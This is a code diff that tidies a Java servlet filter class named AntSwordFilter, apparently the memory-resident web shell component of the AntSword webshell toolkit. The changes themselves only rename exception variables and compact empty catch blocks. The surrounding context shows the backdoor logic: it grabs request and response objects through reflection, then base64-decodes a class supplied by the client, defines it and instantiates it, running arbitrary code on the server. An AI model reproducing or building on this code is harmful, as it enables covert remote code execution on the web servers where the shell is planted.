@@ -42,16 +42,15 @@ public class AntSwordFilter extends ClassLoader implements Filter {
             this.response.setContentType("text/html");
             this.request.setCharacterEncoding(this.cs);
             this.response.setCharacterEncoding(this.cs);
-        } catch (Exception var7) {
-            output.append("ERROR:// " + var7.toString());
+        } catch (Exception e) {
+            output.append("ERROR:// " + e.toString());
         }
 
         try {
             this.response.getWriter().print(tag_s + output.toString() + tag_e);
             this.response.getWriter().flush();
             this.response.getWriter().close();
-        } catch (Exception var6) {
-        }
+        } catch (Exception ignore) { }
 
         return true;
     }
@@ -66,7 +65,7 @@ public class AntSwordFilter extends ClassLoader implements Filter {
                 Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                 this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                 this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
-            } catch (Exception var81) {
+            } catch (Exception e) {
                 if (obj instanceof HttpServletRequest) {
                     this.request = (HttpServletRequest)obj;
 
@@ -77,11 +76,10 @@ public class AntSwordFilter extends ClassLoader implements Filter {
                         Field resp = request2.getClass().getDeclaredField("response");
                         resp.setAccessible(true);
                         this.response = (HttpServletResponse)resp.get(request2);
-                    } catch (Exception var71) {
+                    } catch (Exception eChild) {
                         try {
                             this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
-                        } catch (Exception var6) {
-                        }
+                        } catch (Exception ignore) { }
                     }
                 }
             }
@@ -153,8 +151,7 @@ public class AntSwordFilter extends ClassLoader implements Filter {
         if (cls != null) {
             try {
                 (new AntSwordFilter(this.getClass().getClassLoader())).g(this.base64Decode(cls)).newInstance().equals(new Object[]{req, res});
-            } catch (Exception var8) {
-            }
+            } catch (Exception ignore) { }
         }
     }
 
